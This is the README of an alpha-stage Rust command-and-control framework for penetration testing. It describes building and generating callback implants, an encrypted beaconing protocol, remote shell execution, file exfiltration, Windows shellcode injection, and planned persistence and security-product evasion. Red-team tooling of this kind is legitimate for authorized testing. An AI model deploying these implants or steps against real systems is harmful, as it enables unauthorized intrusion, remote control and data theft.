# Linky C2 Framework

A minimal, Rust-native Command & Control framework. Rewrite of [postrequest/link](https://github.com/postrequest/link).

> **Status: Alpha — not production-ready.**
> See [Roadmap](#roadmap) for what's missing before real-world use.

> **SECURITY WARNING**
> This project was developed with assistance from Claude and Mistral AI.
> Always review and audit the code before use in security-sensitive environments.
> The authors accept no responsibility for unauthorized or illegal use.

---

## Quick start (Podman, 3 steps)
```bash
# 1. Build (includes full Rust toolchain for on-the-fly implant generation)
podman build -t linky-c2 .

# 2. Run (port 8443, implants volume — :Z required on SELinux systems)
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants:Z \
  --name linky-server \
  linky-c2

# 3. Generate a Linux implant from the Linky CLI prompt
linky> generate-linux 192.168.1.10:8443
```

Your implant is in `./implants/link-linux`. No Rust installation needed on the host.

---

## Why Linky?

| Trait | Detail |
|-------|--------|
| **Rust-native** | Harder to reverse than Go/Python — limited RE tooling for Rust binaries |
| **Small codebase** | ~2.5k LOC vs ~50k for Sliver — auditable, forkable |
| **Container-first** | Build + run in 3 commands, no host dependencies |
| **KISS** | One binary, one protocol, no plugin system to learn |

Linky does **not** aim for feature parity with Sliver, Mythic, or Havoc. It's a focused, minimal C2 for simple engagements and learning.

---

## Architecture
```
linky/
├── server/                 # C2 server binary (crate: linky)
│   └── src/
│       ├── main.rs         # Entry: server + GC + CLI threads
│       ├── server.rs       # actix-web 4 + rustls 0.23 (self-signed TLS)
│       ├── routes.rs       # HTTP handlers: 3-stage C2 protocol
│       ├── links.rs        # Link registry and state management
│       ├── tasks.rs        # Per-link task queue
│       ├── cli.rs          # Interactive CLI (rustyline)
│       ├── generate.rs     # Implant builder (invokes cargo)
│       ├── error.rs        # Error types (thiserror)
│       └── ui.rs           # Terminal output helpers
├── links/
│   ├── common/             # Shared: C2 loop, HTTP client, crypto, wire types
│   │   └── src/
│   │       ├── lib.rs      # run_c2_loop(), crypto, types, helpers
│   │       └── dispatch.rs # Cross-platform command dispatch
│   ├── linux/              # Linux implant    → link-linux (~310 LOC)
│   ├── windows/            # Windows implant  → link-windows.exe (~380 LOC)
│   └── osx/                # macOS implant    → link-osx (~220 LOC)
├── server/tests/
│   └── protocol.rs         # 16 integration tests covering all 3 C2 stages
├── .github/workflows/ci.yml # CI: fmt + clippy -D warnings + test + audit
├── Dockerfile              # Single-stage (Rust toolchain embedded for implant gen)
├── CLAUDE.md               # Instructions for Claude Code
└── .mistralrc              # Instructions for Mistral Vibe
```

### C2 protocol (3 stages)

All communication is HTTPS/JSON with AES-256-GCM payload encryption. Each request is validated against an obfuscated User-Agent, a session cookie, and a rolling UUID header.
```
Implant                           Server
  │                                  │
  │── GET /js ───────────────────────▶│  Stage 1: Set-Cookie: banner=banner
  │                                  │
  │── POST /static/register ─────────▶│  Stage 2: register + initial x_request_id
  │   header: X-Client-ID (secret)   │
  │◀─ { x_request_id } ──────────────│
  │                                  │
  │── POST /static/get ──────────────▶│  Stage 3: polling loop
  │   header: x-request-id           │    body: AES-256-GCM encrypted payload
  │   body: { data: hex(nonce+ct) }  │    ← implant submits task output (encrypted)
  │◀─ { data: hex(nonce+ct), xid } ──│    → server returns next task (encrypted)
```

Each implant has a **unique AES-256-GCM key** derived at build time from a random secret via SHA-256. The callback address is also encrypted in the binary. Keys and addresses never appear in plaintext in binaries.

### Security properties

| Property | Implementation |
|----------|---------------|
| Per-implant key | SHA-256(secret ‖ "callback-salt") — random 32-byte secret per build |
| Callback address | AES-256-GCM encrypted in binary, decrypted at runtime |
| Transport | HTTPS/TLS 1.3 (self-signed, rustls 0.23) |
| String obfuscation | `obfstr!()` macro on all sensitive literals |
| Stage validation | UA + session cookie + rolling UUID x-request-id |
| OOM protection | JSON payload limit 64 KB, field truncation (256 bytes) |

---

## CLI reference

### Main menu
```
linky> help
  links                                  Manage active links
  generate <ip:port> [--shellcode]       Build Windows implant (x86_64-pc-windows-gnu)
  generate-linux <ip:port> [--shellcode] Build Linux implant   (x86_64-unknown-linux-musl)
  generate-osx <ip:port> [--shellcode]   Build macOS implant   (x86_64-apple-darwin)
  help                                   Show this help
  exit / kill                            Quit linky

  --shellcode   Linux/macOS: extract .text section via objcopy → flat .bin
                Windows: copy PE (use sRDI/Donut for PIC conversion — item B.9)
                Uses release-shellcode profile (panic=abort, lto, opt-level=z)

  LINKY_OUTPUT_DIR  Output directory for generated implants (default: .)
```

### Link interaction (platform-aware help)
```
  ── Execution ────────────────────────────────────────
  shell <cmd>              Run via /bin/sh or cmd.exe
  cmd <args>               cmd.exe /C wrapper          (Windows only)
  powershell <args>        powershell.exe wrapper       (Windows only)
  ── Navigation ───────────────────────────────────────
  ls / cd / pwd / whoami / pid
  ── Reconnaissance ───────────────────────────────────
  info                     Detailed system information
  ps                       Running processes
  netstat                  Network connections
  ── File transfer ────────────────────────────────────
  download <path>          Download file from implant
  upload <local> <remote>  Upload file to implant
                           Quote paths with spaces: "path/to file" /remote/dest
  ── Operational ──────────────────────────────────────
  sleep <s> [jitter%]      Polling interval (e.g. sleep 30 20)
  killdate <date|clear>    Auto-exit date (e.g. killdate 2026-12-31)
  ── Windows ──────────────────────────────────────────
  integrity                Token integrity level
  inject <pid> <b64>       Inject base64 shellcode into PID
  ── Session ──────────────────────────────────────────
  kill                     Send exit + mark link dead
  back                     Return to links menu
```

The prompt adapts to the implant's platform: `link-1|lnx>`, `link-1|win>`, `link-1|osx>`. Windows-only commands are hidden when interacting with a Linux or macOS link.

### Downloads
Downloaded files are saved to `downloads/<link-name>/<filename>` relative to the server's working directory (or `LINKY_OUTPUT_DIR` if set).

---

## Building from source

### Prerequisites

**Server only:** Rust 1.70+

**Full (server + implant generation):**
```bash
# Debian/Ubuntu
sudo apt-get install -y musl-tools mingw-w64 clang lld pkg-config libssl-dev binutils
rustup target add x86_64-pc-windows-gnu x86_64-unknown-linux-musl

# Fedora/RHEL
sudo dnf install -y musl-gcc mingw64-gcc clang lld pkg-config openssl-devel binutils
rustup target add x86_64-pc-windows-gnu x86_64-unknown-linux-musl
```

`binutils` is required for `objcopy` (used by `--shellcode` on Linux).

### Build & run
```bash
cargo build --release -p linky
./target/release/linky 0.0.0.0:8443
```

### Podman
```bash
podman build -t linky-c2 .
podman run -it --rm -p 8443:8443 -v ./implants:/implants:Z linky-c2
```

---

## Implant capabilities

| Feature | Linux | Windows | macOS |
|---------|-------|---------|-------|
| Shell execution | `/bin/sh -c` | `cmd.exe /C` (CREATE_NO_WINDOW) | `/bin/sh -c` |
| System info | `/proc`, `/etc/os-release` | PowerShell, env vars | `sysctl`, `sw_vers` |
| Process listing | `/proc` parsing | `tasklist /FO CSV` | `ps aux` (shell) |
| Network connections | `/proc/net/tcp*` (IPv4 correct, IPv6 WIP) | `netstat -ano` | `netstat -an` (shell) |
| File download/upload | ✅ | ✅ | ✅ |
| Configurable sleep+jitter | ✅ | ✅ | ✅ |
| Kill date | ✅ | ✅ | ✅ |
| Encrypted C2 comms | AES-256-GCM | AES-256-GCM | AES-256-GCM |
| Per-implant key | ✅ | ✅ | ✅ |
| Obfuscated strings | ✅ | ✅ | ✅ |
| Shellcode export (.bin) | ✅ objcopy | PE copy (sRDI needed) | ✅ objcopy |
| Process injection | — | VirtualAllocEx + CreateRemoteThread | — |
| Integrity level | — | Token query | — |
| Hostname detection | `/etc/hostname` | `COMPUTERNAME` env | `scutil --get ComputerName` |
| External IP | TCP peer addr (server-side) | TCP peer addr | TCP peer addr |

---

## Roadmap

### Current limitations (honest assessment)

- **Evasion**: zero EDR evasion. Windows injection uses the most heavily monitored APIs (VirtualAllocEx + CreateRemoteThread). No AMSI/ETW bypass. Binary signatures are unaddressed.
- **Features**: no persistence, no SOCKS proxy, no credential harvesting, no lateral movement.
- **Operations**: single operator, no logging to disk, no web UI.
- **Network**: TCP6/UDP6 netstat output is currently malformed on Linux (IPv6 hex decoding bug — fix planned in Sprint 5).
- **Transport**: TLS is self-signed, no certificate pinning or domain fronting.

### Roadmap status

| Sprint | Focus | Status |
|--------|-------|--------|
| 0–1.5 | Dead code cleanup, error handling, crypto, factorisation | ✅ Done |
| 1.6 | Cargo.toml cleanup, CLI UX (platform-aware help + prompt) | ✅ Done |
| 2.2 | Build profiles (release + release-shellcode) | ✅ Done |
| 2.6 | `--shellcode` flag: `.bin` via objcopy (Linux), PE (Windows) | ✅ Done |
| 4.1–4.5 | Integration tests, CI/CD, macOS alignment, link-common tests | ✅ Done |
| **5** | **Robustness fixes (crypto dedup, IPv6, backoff, stage3 refactor)** | **🔜 Next** |
| 3 | Persistence (Linux+Windows), SOCKS proxy, env cmd, disk logging | ⬜ Planned |
| 6 | GUI — TUI ratatui or embedded Web UI (decision pending) | ⬜ Planned |
| 2.x | Malleable profiles, indirect syscalls, AMSI/ETW bypass | ⬜ Planned |
| B.9 | sRDI integration (DLL → PIC shellcode Windows) | ⬜ Backlog |

See `TODO.txt` for the detailed task list including the GUI architecture comparison.

---

## Security notice

This tool is for **authorized** penetration testing engagements only. Do not use it against systems without explicit written permission.

---

## Testing
```bash
# Full quality check
cargo fmt --all -- --check
cargo clippy --workspace -- -D warnings
cargo test --workspace

# Build all implants (requires cross-compilation toolchain)
cargo check -p link-linux  --target x86_64-unknown-linux-musl
cargo check -p link-windows --target x86_64-pc-windows-gnu
cargo check -p link-osx
cargo check -p link-common

# Run the server
cargo run --release --bin linky 0.0.0.0:8443
```

### Verify end-to-end
```
linky> generate-linux 127.0.0.1:8443
# Run the generated implant in another terminal, then:
linky> links
linky> -i link-1
link-1|lnx> whoami
```

Result appears in a formatted box:
```
╔═ link-1 · whoami · 14:38:23 ═══════════════════╗
║ root@hostname
╚═════════════════════════════════════════════════╝
```

---

## Known bugs

| ID | Severity | Description | Fix target |
|----|----------|-------------|------------|
| B6-1 | Medium | IPv6 addresses malformed in `netstat` output (Linux) | Sprint 5.3 |
| B6-2 | Minor | `show_completed_task_results()` in cli.rs is effectively dead code | Sprint 5.2 |
| B6-3 | Minor | Crypto helpers duplicated in 3 locations (risk of divergence) | Sprint 5.1 |
| B6-4 | Minor | `downloads/` dir is relative to server CWD, not documented | Sprint 5.6 |
| B6-5 | Minor | Stage 1 retry loop has no backoff (floods unreachable server) | Sprint 5.4 |
| B6-6 | Minor | Network error in stage 3 discards pending task output | Sprint 5.5 |
| B6-7 | Minor | `upload` doesn't support single-quoted paths | Sprint 5.x |
| B6-8 | Minor | 64 KB JSON limit too small for large file uploads | Sprint 5.8 |
| B6-9 | Minor | `inject_shellcode` uses undocumented `transmute` | Sprint 5.9 |
| — | Minor | Link counter resets on server restart | Backlog |

---

## Configuration for AI Developers

- **`CLAUDE.md`** — conventions, architecture, security rules for Claude Code
- **`.mistralrc`** — conventions and workflow for Mistral Vibe
- **`TODO.txt`** — authoritative roadmap including GUI architecture proposals